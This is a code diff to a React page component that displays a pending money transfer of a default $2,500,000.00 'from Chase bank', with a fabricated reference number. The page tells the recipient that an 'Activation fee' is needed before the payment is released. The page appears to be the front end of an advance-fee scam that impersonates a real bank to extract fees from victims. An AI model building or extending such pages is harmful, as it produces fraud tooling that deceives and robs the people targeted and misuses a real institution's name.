@@ -8,6 +8,9 @@ import { Link } from "react-router-dom";
 
 const Pending = () => {
   const name = localStorage.getItem("name");
+  const amount = localStorage.getItem("amount") || "2,500,000.00";
+  const email = localStorage.getItem("email") || "gunter@gmail.com";
+
   return (
     <div className="pending-con">
       <div className="pending-img-box">
@@ -22,8 +25,34 @@ const Pending = () => {
       <p className="approval">Transfer On Pending... Approval Fee Needed.</p>
       <p className="sure">
         We are waiting for Activation fee from <b>{name}</b> to receive the
-        payment instantly.{" "}
+        payment instantly. We will sent a notification to <b>{email}</b> as soon
+        as the payment is completed.
       </p>
+      <div className="details-box">
+        <h3>Payment Details</h3>
+        <div className="details-box-info">
+          <div className="payment-info-p">
+            <p>Payment to</p>
+            <p>{name}</p>
+          </div>
+          <div className="payment-info-p">
+            <p>Account </p>
+            <p>Chase bank</p>
+          </div>
+          <div className="payment-info-p">
+            <p>Amount </p>
+            <p>${amount}</p>
+          </div>
+          <div className="payment-info-p">
+            <p>
+              Confirmation <br /> Number{" "}
+            </p>
+            <p>
+              Reference Number <br /> 205925202304198
+            </p>
+          </div>
+        </div>
+      </div>
       <p>
         <Link className="back-to-home" to={"/"}>
           Back to home{" "}
